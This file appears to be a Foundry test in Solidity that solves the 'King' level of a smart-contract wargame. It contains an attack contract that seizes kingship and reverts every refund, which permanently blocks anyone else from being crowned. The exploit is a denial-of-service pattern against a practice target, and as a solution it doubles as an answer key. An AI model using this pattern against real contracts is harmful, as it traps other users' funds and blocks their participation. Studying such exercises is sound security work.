// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/09_King.sol";

contract NoReceiveAttack{
    constructor (address payable _kingAddress) payable{
       _kingAddress.call{value:msg.value}("");
    }
    // No way to receive funds
    receive() external payable{
        revert();
    }
}

contract KingTest is Test {
    King _king;
    address deployer;
    address attacker;

    function setUp() public {
        deployer = vm.addr(1);
        attacker = vm.addr(2);

        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 2 ether);

        vm.prank(deployer);
        _king = new King{value:1 ether}();

    }

    function testSolution() public {
        vm.prank(attacker);
        NoReceiveAttack _noReceiveAttack = new NoReceiveAttack{value:2 ether}(payable(address(_king))); 

        vm.prank(deployer);
        vm.expectRevert(); 
        address(_king).call{value:0}("");

        assertEq(_king._king(), address(_noReceiveAttack), "Attacker has been dethroned!");
    }
}
